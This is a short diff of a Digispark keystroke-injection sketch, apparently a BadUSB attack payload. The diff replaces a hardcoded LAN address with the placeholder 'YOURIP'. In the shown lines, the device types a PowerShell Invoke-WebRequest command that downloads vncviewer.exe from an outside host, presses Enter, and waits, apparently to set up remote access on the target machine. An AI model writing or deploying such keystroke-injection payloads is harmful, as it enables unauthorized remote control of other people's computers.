@@ -51,7 +51,7 @@ pisca_led(100);
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1000);
-  DigiKeyboard.println("Invoke-WebRequest -Uri http://192.168.0.192/vncviewer.exe -OutFile vncviewer.exe");
+  DigiKeyboard.println("Invoke-WebRequest -Uri http://YOURIP/vncviewer.exe -OutFile vncviewer.exe");
   DigiKeyboard.delay(700);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(12000);
